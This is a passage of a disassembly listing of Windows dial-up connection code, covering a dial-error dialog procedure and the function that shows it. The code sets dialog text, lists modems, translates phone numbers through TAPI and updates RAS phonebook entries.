		jz	loc_1004390
		sub	eax, 0BDh
		jz	short loc_1004254
		dec	eax
		jz	loc_100439F
		and	[ebp+var_120], esi
		jmp	loc_1004972
; ---------------------------------------------------------------------------

loc_1004254:				; CODE XREF: DialErrDlgProc(x,x,x,x)+6Bj
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	[eax+0Ch], ebx
		call	?IsNT@@YAHXZ	; IsNT(void)
		neg	eax
		sbb	eax, eax
		push	0		; lParam
		and	eax, 2Ch
		add	eax, 24h
		push	eax		; wParam
		push	0C5h		; Msg
		mov	edi, 3F9h
		push	edi		; nIDDlgItem
		push	ebx		; hDlg
		mov	?g_iMyMaxPhone@@3HA, eax ; int g_iMyMaxPhone
		call	ds:__imp__SendDlgItemMessageW@20 ; SendDlgItemMessageW(x,x,x,x,x)
		call	?DialErrGetDisplayableNumber@@YAJXZ ; DialErrGetDisplayableNumber(void)
		test	eax, eax
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		jz	short loc_10042A0
		and	dword_100ECF8, 0
		add	eax, 18h
		push	eax
		jmp	short loc_10042B0
; ---------------------------------------------------------------------------

loc_10042A0:				; CODE XREF: DialErrDlgProc(x,x,x,x)+BCj
		push	dword ptr [eax+218h] ; lpString
		mov	dword_100ECF8, 1

loc_10042B0:				; CODE XREF: DialErrDlgProc(x,x,x,x)+C9j
		push	edi		; nIDDlgItem
		push	ebx		; hDlg
		call	ds:__imp__SetDlgItemTextW@12 ; SetDlgItemTextW(x,x,x)
		push	2BCh		; int
		push	1		; int
		push	3F1h		; nIDDlgItem
		push	ebx		; hDlg
		call	ds:__imp__GetDlgItem@8 ; GetDlgItem(x,x)
		push	eax		; hWnd
		call	?MakeBold@@YAJPAUHWND__@@HJ@Z ;	MakeBold(HWND__	*,int,long)
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	dword ptr [eax+4] ; unsigned __int32
		call	?RasErrorToIDS@@YAGK@Z ; RasErrorToIDS(ulong)
		movzx	ecx, ax
		add	esp, 10h
		cmp	ecx, 0FFFFFFFFh
		jz	short loc_1004302
		test	ax, ax
		jz	short loc_1004302
		push	eax		; unsigned __int16
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		pop	ecx
		push	eax		; lpString
		push	3FCh		; nIDDlgItem
		push	ebx		; hDlg
		call	ds:__imp__SetDlgItemTextW@12 ; SetDlgItemTextW(x,x,x)

loc_1004302:				; CODE XREF: DialErrDlgProc(x,x,x,x)+112j
					; DialErrDlgProc(x,x,x,x)+117j
		mov	esi, 3FDh
		push	esi		; nIDDlgItem
		push	ebx		; hDlg
		call	?ProcessDBCS@@YAXPAUHWND__@@H@Z	; ProcessDBCS(HWND__ *,int)
		push	edi		; nIDDlgItem
		push	ebx		; hDlg
		call	?ProcessDBCS@@YAXPAUHWND__@@H@Z	; ProcessDBCS(HWND__ *,int)
		add	esp, 10h
		call	?FillModems@@YAJXZ ; FillModems(void)
		push	esi		; nIDDlgItem
		mov	esi, ds:__imp__GetDlgItem@8 ; GetDlgItem(x,x)
		push	ebx		; hDlg
		call	esi ; GetDlgItem(x,x) ;	GetDlgItem(x,x)
		push	eax		; hWnd
		call	ds:__imp__SetFocus@4 ; SetFocus(x)
		mov	eax, offset ?HelpKybdHookProc@@YGJHIJ@Z	; HelpKybdHookProc(int,uint,long)
		test	eax, eax
		mov	lpfn, eax
		jz	short loc_1004361
		call	ds:__imp__GetCurrentThreadId@0 ; GetCurrentThreadId()
		push	eax		; dwThreadId
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	dword ptr [eax+21Ch] ; hmod
		push	lpfn		; lpfn
		push	2		; idHook
		call	ds:__imp__SetWindowsHookExW@16 ; SetWindowsHookExW(x,x,x,x)
		mov	hhk, eax

loc_1004361:				; CODE XREF: DialErrDlgProc(x,x,x,x)+165j
		xor	eax, eax
		cmp	dword_100E080, eax
		mov	[ebp+var_120], eax
		jnz	short loc_1004381
		push	eax		; bEnable
		push	3FFh		; nIDDlgItem
		push	ebx		; hDlg
		call	esi ; GetDlgItem(x,x) ;	GetDlgItem(x,x)
		push	eax		; hWnd
		call	ds:__imp__EnableWindow@8 ; EnableWindow(x,x)

loc_1004381:				; CODE XREF: DialErrDlgProc(x,x,x,x)+19Aj
		mov	dword_100ECF4, 1
		jmp	loc_1004972
; ---------------------------------------------------------------------------

loc_1004390:				; CODE XREF: DialErrDlgProc(x,x,x,x)+60j
		push	3E9h		; dwData
		push	1		; uCommand
		push	offset szHelp	; "connect.hlp>proc4"
		push	ebx		; hWndMain
		call	edi ; WinHelpW(x,x,x,x)	; WinHelpW(x,x,x,x)

loc_100439F:				; CODE XREF: DialErrDlgProc(x,x,x,x)+6Ej
		mov	ecx, [ebp+arg_8]
		movzx	eax, cx
		dec	eax
		dec	eax
		jz	loc_10048E6
		sub	eax, 3EBh
		jz	loc_10048D2
		dec	eax
		dec	eax
		jz	loc_10046BC
		sub	eax, 0Ah
		jz	loc_100462A
		sub	eax, 4
		jz	loc_100449C
		dec	eax
		dec	eax
		jnz	loc_100494C
		mov	esi, ds:__imp__EnableWindow@8 ;	EnableWindow(x,x)
		xor	edi, edi
		push	edi		; bEnable
		push	ebx		; hWnd
		call	esi ; EnableWindow(x,x)	; EnableWindow(x,x)
		mov	eax, ?g_pdevice@@3PAUtagDEVICE@@A ; tagDEVICE *	g_pdevice
		cmp	dword ptr [eax], 0FFFFFFFFh
		jnz	short loc_10043F2
		mov	[eax], edi

loc_10043F2:				; CODE XREF: DialErrDlgProc(x,x,x,x)+219j
		lea	eax, [ebp+dwNumDevs]
		push	eax		; lpdwNumDevs
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	edi		; lpszAppName
		push	offset ?LineCallback@@YGXKKKKKK@Z ; lpfnCallback
		push	dword ptr [eax+21Ch] ; hInstance
		add	eax, 10h
		push	eax		; lphLineApp
		call	_lineInitialize@20 ; lineInitialize(x,x,x,x,x)
		test	eax, eax
		jnz	short loc_100447F
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		lea	ecx, [eax+18h]
		push	ecx		; lpszAddressIn
		mov	ecx, ?g_pdevice@@3PAUtagDEVICE@@A ; tagDEVICE *	g_pdevice
		push	ebx		; hwndOwner
		push	dword ptr [eax+14h] ; dwAPIVersion
		push	dword ptr [ecx]	; dwDeviceID
		push	dword ptr [eax+10h] ; hLineApp
		call	_lineTranslateDialogW@20 ; lineTranslateDialogW(x,x,x,x,x)
		call	?DialErrGetDisplayableNumber@@YAJXZ ; DialErrGetDisplayableNumber(void)
		test	eax, eax
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		jz	short loc_100444E
		add	eax, 18h
		mov	dword_100ECF8, edi
		push	eax
		jmp	short loc_100445E
; ---------------------------------------------------------------------------

loc_100444E:				; CODE XREF: DialErrDlgProc(x,x,x,x)+26Bj
		push	dword ptr [eax+218h] ; lpString
		mov	dword_100ECF8, 1

loc_100445E:				; CODE XREF: DialErrDlgProc(x,x,x,x)+277j
		push	3F9h		; nIDDlgItem
		push	ebx		; hDlg
		call	ds:__imp__SetDlgItemTextW@12 ; SetDlgItemTextW(x,x,x)
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	dword ptr [eax+10h] ; hLineApp
		call	_lineShutdown@4	; lineShutdown(x)
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	[eax+10h], edi

loc_100447F:				; CODE XREF: DialErrDlgProc(x,x,x,x)+240j
		push	1		; bEnable
		push	ebx		; hWnd
		call	esi ; EnableWindow(x,x)	; EnableWindow(x,x)
		push	3EFh		; nIDDlgItem
		push	ebx		; hDlg
		call	ds:__imp__GetDlgItem@8 ; GetDlgItem(x,x)
		push	eax		; hWnd
		call	ds:__imp__SetFocus@4 ; SetFocus(x)
		jmp	loc_1004972
; ---------------------------------------------------------------------------

loc_100449C:				; CODE XREF: DialErrDlgProc(x,x,x,x)+1F7j
		shr	ecx, 10h
		cmp	cx, 1
		jnz	loc_1004972
		mov	edi, ds:__imp__SendDlgItemMessageW@20 ;	SendDlgItemMessageW(x,x,x,x,x)
		push	0		; lParam
		push	0		; wParam
		push	147h		; Msg
		mov	esi, 3FDh
		push	esi		; nIDDlgItem
		push	ebx		; hDlg
		call	edi ; SendDlgItemMessageW(x,x,x,x,x) ; SendDlgItemMessageW(x,x,x,x,x)
		push	0		; lParam
		push	eax		; wParam
		push	150h		; Msg
		push	esi		; nIDDlgItem
		push	ebx		; hDlg
		call	edi ; SendDlgItemMessageW(x,x,x,x,x) ; SendDlgItemMessageW(x,x,x,x,x)
		mov	edi, eax
		cmp	edi, 0FFFFFFFFh
		jz	loc_1004972
		lea	eax, [ebp+var_11C]
		push	eax		; void *
		lea	eax, [ebp+hMem]
		push	eax		; int
		lea	eax, [ebp+var_124]
		push	eax		; int
		lea	eax, [ebp+var_118]
		push	eax		; int
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	dword ptr [eax]	; int
		push	0		; int
		call	?MyRasGetEntryProperties@@YAJPAG0PAPAUtagRASENTRYW@@PAKPAPAUtagRASDEVINFOW@@2@Z	; MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)
		add	esp, 18h
		test	eax, eax
		jnz	loc_1004926
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		imul	edi, 128h
		mov	eax, [eax+220h]
		mov	esi, [ebp+var_118]
		mov	ebx, ds:__imp__lstrcpynW@12 ; lstrcpynW(x,x,x)
		push	11h		; iMaxLength
		lea	eax, [eax+edi+4]
		push	eax		; lpString2
		lea	eax, [esi+764h]
		push	eax		; lpString1
		call	ebx ; lstrcpynW(x,x,x) ; lstrcpynW(x,x,x)
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	eax, [eax+220h]
		push	81h		; iMaxLength
		lea	eax, [eax+edi+26h]
		push	eax		; lpString2
		lea	eax, [esi+786h]
		push	eax		; lpString1
		call	ebx ; lstrcpynW(x,x,x) ; lstrcpynW(x,x,x)
		cmp	[ebp+hMem], 0
		jz	short loc_100456D
		push	[ebp+hMem]	; hMem
		call	ds:__imp__GlobalFree@4 ; GlobalFree(x)

loc_100456D:				; CODE XREF: DialErrDlgProc(x,x,x,x)+38Aj
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	ebx, [eax+220h]
		add	ebx, edi
		push	40h		; dwBytes
		mov	[ebp+hMem], ebx
		mov	[ebp+var_11C], 128h
		call	??2@YAPAXI@Z	; operator new(uint)
		test	eax, eax
		pop	ecx
		jz	short loc_10045A5
		mov	ecx, eax
		call	??0RNAAPI@@QAE@XZ ; RNAAPI::RNAAPI(void)
		mov	[ebp+var_110], eax
		jmp	short loc_10045AC
; ---------------------------------------------------------------------------

loc_10045A5:				; CODE XREF: DialErrDlgProc(x,x,x,x)+3BFj
		and	[ebp+var_110], 0

loc_10045AC:				; CODE XREF: DialErrDlgProc(x,x,x,x)+3CEj
		mov	ecx, [ebp+var_110]
		test	ecx, ecx
		jz	loc_100492C
		push	[ebp+var_11C]
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	ebx
		push	[ebp+var_124]
		push	esi
		push	dword ptr [eax]
		push	0
		call	?RasSetEntryPropertiesW@RNAAPI@@QAEKPAG0PAEK1K@Z ; RNAAPI::RasSetEntryPropertiesW(ushort *,ushort *,uchar *,ulong,uchar	*,ulong)
		mov	edi, eax
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	dword ptr [eax]	; unsigned __int16 *
		lea	eax, [esi+14Ch]
		push	eax		; unsigned __int16 *
		call	?LclSetEntryScriptPatch@@YAHPAG0@Z ; LclSetEntryScriptPatch(ushort *,ushort *)
		and	[ebp+hMem], 0
		test	edi, edi
		pop	ecx
		pop	ecx
		jz	loc_100492C
		push	10010h		; uType
		push	1F4h		; unsigned __int16
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		pop	ecx
		push	eax		; lpCaption
		push	412h		; unsigned __int16
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		pop	ecx
		push	eax		; lpText
		push	[ebp+hWnd]	; hWnd

loc_100461F:				; CODE XREF: DialErrDlgProc(x,x,x,x)+6EAj
		call	ds:__imp__MessageBoxW@16 ; MessageBoxW(x,x,x,x)
		jmp	loc_100492C
; ---------------------------------------------------------------------------

loc_100462A:				; CODE XREF: DialErrDlgProc(x,x,x,x)+1EEj
		shr	ecx, 10h
		cmp	cx, 300h
		jnz	loc_1004972
		xor	esi, esi
		inc	esi
		cmp	dword_100ECF4, esi
		jnz	loc_1004972
		push	80h		; cchMax
		lea	eax, [ebp+String1]
		push	eax		; lpString
		push	3F9h		; nIDDlgItem
		push	ebx		; hDlg
		call	ds:__imp__GetDlgItemTextW@16 ; GetDlgItemTextW(x,x,x,x)
		test	eax, eax
		jz	loc_1004972
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		xor	edi, edi
		cmp	dword_100ECF8, edi
		jz	short loc_100467E
		mov	eax, [eax+218h]
		jmp	short loc_1004681
; ---------------------------------------------------------------------------

loc_100467E:				; CODE XREF: DialErrDlgProc(x,x,x,x)+49Fj
		add	eax, 18h

loc_1004681:				; CODE XREF: DialErrDlgProc(x,x,x,x)+4A7j
		push	eax		; lpString2
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		call	ds:__imp__lstrcmpW@8 ; lstrcmpW(x,x)
		test	eax, eax
		jz	loc_1004972
		push	edi		; bEnable
		push	3FFh		; nIDDlgItem
		push	ebx		; hDlg
		call	ds:__imp__GetDlgItem@8 ; GetDlgItem(x,x)
		push	eax		; hWnd
		call	ds:__imp__EnableWindow@8 ; EnableWindow(x,x)
		mov	dword_100E080, edi
		mov	dword_100ECF0, esi
		jmp	loc_1004972
; ---------------------------------------------------------------------------

loc_10046BC:				; CODE XREF: DialErrDlgProc(x,x,x,x)+1E5j
		push	102h		; dwBytes
		push	40h		; uFlags
		call	ds:__imp__GlobalAlloc@8	; GlobalAlloc(x,x)
		test	eax, eax
		mov	[ebp+lpString2], eax
		jnz	short loc_10046FC
		push	10010h		; uType
		push	1F4h		; unsigned __int16
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		pop	ecx
		push	eax		; lpCaption
		push	1F7h		; unsigned __int16
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		pop	ecx
		push	eax		; lpText
		push	ebx		; hWnd
		call	ds:__imp__MessageBoxW@16 ; MessageBoxW(x,x,x,x)
		jmp	loc_100494C
; ---------------------------------------------------------------------------

loc_10046FC:				; CODE XREF: DialErrDlgProc(x,x,x,x)+4FCj
		cmp	dword_100ECF0, 0
		jz	loc_10048C4
		push	80h		; cchMax
		push	eax		; lpString
		mov	edi, 3F9h
		push	edi		; nIDDlgItem
		push	ebx		; hDlg
		call	ds:__imp__GetDlgItemTextW@16 ; GetDlgItemTextW(x,x,x,x)
		test	eax, eax
		jz	loc_10048C4
		cmp	dword_100ECF8, 0
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		jz	short loc_100473A
		mov	eax, [eax+218h]
		jmp	short loc_100473D
; ---------------------------------------------------------------------------

loc_100473A:				; CODE XREF: DialErrDlgProc(x,x,x,x)+55Bj
		add	eax, 18h

loc_100473D:				; CODE XREF: DialErrDlgProc(x,x,x,x)+563j
		push	eax		; lpString2
		push	[ebp+lpString2]	; lpString1
		call	ds:__imp__lstrcmpW@8 ; lstrcmpW(x,x)
		test	eax, eax
		jz	loc_10048C4
		mov	ecx, [ebp+lpString2]
		jmp	short loc_1004783
; ---------------------------------------------------------------------------

loc_100475A:				; CODE XREF: DialErrDlgProc(x,x,x,x)+5B2j
		mov	eax, ?szValidPhoneCharacters@@3PAGA ; ushort * szValidPhoneCharacters
		test	ax, ax
		mov	edx, offset ?szValidPhoneCharacters@@3PAGA ; ushort * szValidPhoneCharacters
		jz	short loc_1004789
		mov	si, [ecx]

loc_100476C:				; CODE XREF: DialErrDlgProc(x,x,x,x)+5A4j
		cmp	si, ax
		jz	short loc_100477B
		inc	edx
		inc	edx
		mov	ax, [edx]
		test	ax, ax
		jnz	short loc_100476C

loc_100477B:				; CODE XREF: DialErrDlgProc(x,x,x,x)+59Aj
		cmp	word ptr [edx],	0
		jz	short loc_1004789
		inc	ecx
		inc	ecx

loc_1004783:				; CODE XREF: DialErrDlgProc(x,x,x,x)+583j
		cmp	word ptr [ecx],	0
		jnz	short loc_100475A

loc_1004789:				; CODE XREF: DialErrDlgProc(x,x,x,x)+592j
					; DialErrDlgProc(x,x,x,x)+5AAj
		xor	eax, eax
		cmp	[ecx], ax
		jz	short loc_10047C8
		push	10010h		; uType
		push	1F4h		; unsigned __int16
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		pop	ecx
		push	eax		; lpCaption
		push	1FBh		; unsigned __int16
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		pop	ecx
		push	eax		; lpText
		push	ebx		; hWnd
		call	ds:__imp__MessageBoxW@16 ; MessageBoxW(x,x,x,x)
		push	edi		; nIDDlgItem
		push	ebx		; hDlg
		call	ds:__imp__GetDlgItem@8 ; GetDlgItem(x,x)
		push	eax		; hWnd
		call	ds:__imp__SetFocus@4 ; SetFocus(x)
		jmp	loc_100494C
; ---------------------------------------------------------------------------

loc_10047C8:				; CODE XREF: DialErrDlgProc(x,x,x,x)+5B9j
		lea	ecx, [ebp+var_11C]
		push	ecx		; void *
		lea	ecx, [ebp+hMem]
		push	ecx		; int
		lea	ecx, [ebp+var_124]
		push	ecx		; int
		lea	ecx, [ebp+var_118]
		push	ecx		; int
		mov	ecx, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	[ebp+var_11C], eax
		mov	[ebp+var_124], eax
		push	dword ptr [ecx]	; int
		push	eax		; int
		call	?MyRasGetEntryProperties@@YAJPAG0PAPAUtagRASENTRYW@@PAKPAPAUtagRASDEVINFOW@@2@Z	; MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)
		add	esp, 18h
		test	eax, eax
		jnz	loc_1004926
		push	[ebp+lpString2]	; lpString2
		mov	esi, [ebp+var_118]
		lea	eax, [esi+26h]
		push	eax		; lpString1
		call	ds:__imp__lstrcpyW@8 ; lstrcpyW(x,x)
		xor	edi, edi
		mov	[esi+8], edi
		mov	[esi+0Ch], edi
		mov	[esi+10h], di
		and	dword ptr [esi+4], 0FFFFFFFEh
		push	40h		; dwBytes
		call	??2@YAPAXI@Z	; operator new(uint)
		cmp	eax, edi
		pop	ecx
		jz	short loc_100484A
		mov	ecx, eax
		call	??0RNAAPI@@QAE@XZ ; RNAAPI::RNAAPI(void)
		mov	[ebp+var_110], eax
		jmp	short loc_1004850
; ---------------------------------------------------------------------------

loc_100484A:				; CODE XREF: DialErrDlgProc(x,x,x,x)+664j
		mov	[ebp+var_110], edi

loc_1004850:				; CODE XREF: DialErrDlgProc(x,x,x,x)+673j
		mov	ecx, [ebp+var_110]
		cmp	ecx, edi
		jz	loc_100492C
		push	[ebp+var_11C]
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	[ebp+hMem]
		push	[ebp+var_124]
		push	esi
		push	dword ptr [eax]
		push	edi
		call	?RasSetEntryPropertiesW@RNAAPI@@QAEKPAG0PAEK1K@Z ; RNAAPI::RasSetEntryPropertiesW(ushort *,ushort *,uchar *,ulong,uchar	*,ulong)
		mov	[ebp+hWnd], eax
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	dword ptr [eax]	; unsigned __int16 *
		lea	eax, [esi+14Ch]
		push	eax		; unsigned __int16 *
		call	?LclSetEntryScriptPatch@@YAHPAG0@Z ; LclSetEntryScriptPatch(ushort *,ushort *)
		cmp	[ebp+hWnd], edi
		pop	ecx
		pop	ecx
		jz	short loc_10048C4
		push	10010h
		push	1F4h		; unsigned __int16
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		pop	ecx
		push	eax
		push	412h		; unsigned __int16
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		pop	ecx
		push	eax
		push	ebx
		jmp	loc_100461F
; ---------------------------------------------------------------------------

loc_10048C4:				; CODE XREF: DialErrDlgProc(x,x,x,x)+52Ej
					; DialErrDlgProc(x,x,x,x)+549j	...
		push	7FFDh		; nResult

loc_10048C9:				; CODE XREF: DialErrDlgProc(x,x,x,x)+716j
		push	ebx		; hDlg
		call	ds:__imp__EndDialog@8 ;	EndDialog(x,x)
		jmp	short loc_100492C
; ---------------------------------------------------------------------------

loc_10048D2:				; CODE XREF: DialErrDlgProc(x,x,x,x)+1DDj
		push	3E9h		; dwData
		push	1		; uCommand
		push	offset szHelp	; "connect.hlp>proc4"
		push	ebx		; hWndMain
		call	edi ; WinHelpW(x,x,x,x)	; WinHelpW(x,x,x,x)
		jmp	loc_1004972
; ---------------------------------------------------------------------------

loc_10048E6:				; CODE XREF: DialErrDlgProc(x,x,x,x)+1D2j
		push	7FFFh
		jmp	short loc_10048C9
; ---------------------------------------------------------------------------

loc_10048ED:				; CODE XREF: DialErrDlgProc(x,x,x,x)+51j
		push	7FFFh		; nResult
		push	ebx		; hDlg
		call	ds:__imp__EndDialog@8 ;	EndDialog(x,x)
		jmp	short loc_1004972
; ---------------------------------------------------------------------------

loc_10048FB:				; CODE XREF: DialErrDlgProc(x,x,x,x)+48j
		push	3F1h		; nIDDlgItem
		push	ebx		; hDlg
		call	ds:__imp__GetDlgItem@8 ; GetDlgItem(x,x)
		push	eax		; hWnd
		call	?ReleaseBold@@YAJPAUHWND__@@@Z ; ReleaseBold(HWND__ *)
		mov	eax, hhk
		cmp	eax, esi
		pop	ecx
		jz	short loc_100491E
		push	eax		; hhk
		call	ds:__imp__UnhookWindowsHookEx@4	; UnhookWindowsHookEx(x)

loc_100491E:				; CODE XREF: DialErrDlgProc(x,x,x,x)+740j
		mov	[ebp+var_120], esi
		jmp	short loc_100492C
; ---------------------------------------------------------------------------

loc_1004926:				; CODE XREF: DialErrDlgProc(x,x,x,x)+332j
					; DialErrDlgProc(x,x,x,x)+62Ej
		mov	esi, [ebp+var_118]

loc_100492C:				; CODE XREF: DialErrDlgProc(x,x,x,x)+3DFj
					; DialErrDlgProc(x,x,x,x)+421j	...
		test	esi, esi
		jz	short loc_1004937
		push	esi		; hMem
		call	ds:__imp__GlobalFree@4 ; GlobalFree(x)

loc_1004937:				; CODE XREF: DialErrDlgProc(x,x,x,x)+759j
		cmp	[ebp+hMem], 0
		jz	short loc_100494C
		push	[ebp+hMem]	; hMem
		call	ds:__imp__GlobalFree@4 ; GlobalFree(x)

loc_100494C:				; CODE XREF: DialErrDlgProc(x,x,x,x)+1FFj
					; DialErrDlgProc(x,x,x,x)+522j	...
		cmp	[ebp+lpString2], 0
		jz	short loc_1004961
		push	[ebp+lpString2]	; hMem
		call	ds:__imp__GlobalFree@4 ; GlobalFree(x)

loc_1004961:				; CODE XREF: DialErrDlgProc(x,x,x,x)+77Ej
		mov	ecx, [ebp+var_110] ; void *
		test	ecx, ecx
		jz	short loc_1004972
		push	1		; char
		call	??_GRNAAPI@@QAEPAXI@Z ;	RNAAPI::`scalar	deleting destructor'(uint)

loc_1004972:				; CODE XREF: DialErrDlgProc(x,x,x,x)+7Aj
					; DialErrDlgProc(x,x,x,x)+1B6j	...
		mov	ecx, [ebp+var_4]
		mov	eax, [ebp+var_120]
		pop	edi
		pop	esi
		pop	ebx
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn	10h
_DialErrDlgProc@16 endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl ShowDialErrDialog(int, int, LPCWSTR lpString2, int, HWND hWndParent)
?ShowDialErrDialog@@YAJPAUtagGATHEREDINFO@@JPAGPAUHINSTANCE__@@PAUHWND__@@@Z proc near
					; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+248p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
lpString2	= dword	ptr  10h
arg_C		= dword	ptr  14h
hWndParent	= dword	ptr  18h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, ds:__imp__GlobalAlloc@8 ; GlobalAlloc(x,x)
		push	edi
		push	224h		; dwBytes
		push	40h		; uFlags
		call	esi ; GlobalAlloc(x,x) ; GlobalAlloc(x,x)
		test	eax, eax
		mov	?g_pcDialErr@@3PAUtagDialErr@@A, eax ; tagDialErr * g_pcDialErr
		jnz	short loc_10049D3
		push	10h		; uType
		push	1F4h		; unsigned __int16
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		pop	ecx
		push	eax		; lpCaption
		push	1F7h		; unsigned __int16
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		pop	ecx
		push	eax		; lpText
		push	[ebp+hWndParent] ; hWnd
		call	ds:__imp__MessageBoxW@16 ; MessageBoxW(x,x,x,x)

loc_10049CE:				; CODE XREF: ShowDialErrDialog(tagGATHEREDINFO *,long,ushort *,HINSTANCE__ *,HWND__ *)+61j
		push	8
		pop	edi
		jmp	short loc_1004A3B
; ---------------------------------------------------------------------------

loc_10049D3:				; CODE XREF: ShowDialErrDialog(tagGATHEREDINFO *,long,ushort *,HINSTANCE__ *,HWND__ *)+1Dj
		push	101h		; dwBytes
		push	40h		; uFlags
		call	esi ; GlobalAlloc(x,x) ; GlobalAlloc(x,x)
		mov	ecx, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	[ecx], eax
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	eax, [eax]
		test	eax, eax
		jz	short loc_10049CE
		push	[ebp+lpString2]	; lpString2
		push	eax		; lpString1
		call	ds:__imp__lstrcpyW@8 ; lstrcpyW(x,x)
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	ecx, [ebp+arg_0]
		mov	[eax+8], ecx
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	ecx, [ebp+arg_4]
		mov	[eax+4], ecx
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	ecx, [ebp+arg_C]
		mov	[eax+21Ch], ecx
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	eax		; dwInitParam
		push	offset _DialErrDlgProc@16 ; lpDialogFunc
		push	[ebp+hWndParent] ; hWndParent
		push	70h		; lpTemplateName
		push	dword ptr [eax+21Ch] ; hInstance
		call	ds:__imp__DialogBoxParamW@20 ; DialogBoxParamW(x,x,x,x,x)
		mov	edi, eax

loc_1004A3B:				; CODE XREF: ShowDialErrDialog(tagGATHEREDINFO *,long,ushort *,HINSTANCE__ *,HWND__ *)+45j
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	eax, [eax]
		test	eax, eax
		mov	esi, ds:__imp__GlobalFree@4 ; GlobalFree(x)
		jz	short loc_1004A4F
		push	eax		; hMem
		call	esi ; GlobalFree(x) ; GlobalFree(x)

loc_1004A4F:				; CODE XREF: ShowDialErrDialog(tagGATHEREDINFO *,long,ushort *,HINSTANCE__ *,HWND__ *)+BEj
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	eax, [eax+218h]
		test	eax, eax
		jz	short loc_1004A61
		push	eax		; hMem
		call	esi ; GlobalFree(x) ; GlobalFree(x)

loc_1004A61:				; CODE XREF: ShowDialErrDialog(tagGATHEREDINFO *,long,ushort *,HINSTANCE__ *,HWND__ *)+D0j
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		mov	eax, [eax+220h]
		test	eax, eax
		jz	short loc_1004A73
		push	eax		; hMem
		call	esi ; GlobalFree(x) ; GlobalFree(x)

loc_1004A73:				; CODE XREF: ShowDialErrDialog(tagGATHEREDINFO *,long,ushort *,HINSTANCE__ *,HWND__ *)+E2j
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		and	dword ptr [eax+220h], 0
		push	?g_pcDialErr@@3PAUtagDialErr@@A	; hMem
		call	esi ; GlobalFree(x) ; GlobalFree(x)
		and	?g_pcDialErr@@3PAUtagDialErr@@A, 0 ; tagDialErr	* g_pcDialErr
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebp
		retn
?ShowDialErrDialog@@YAJPAUtagGATHEREDINFO@@JPAGPAUHINSTANCE__@@PAUHWND__@@@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

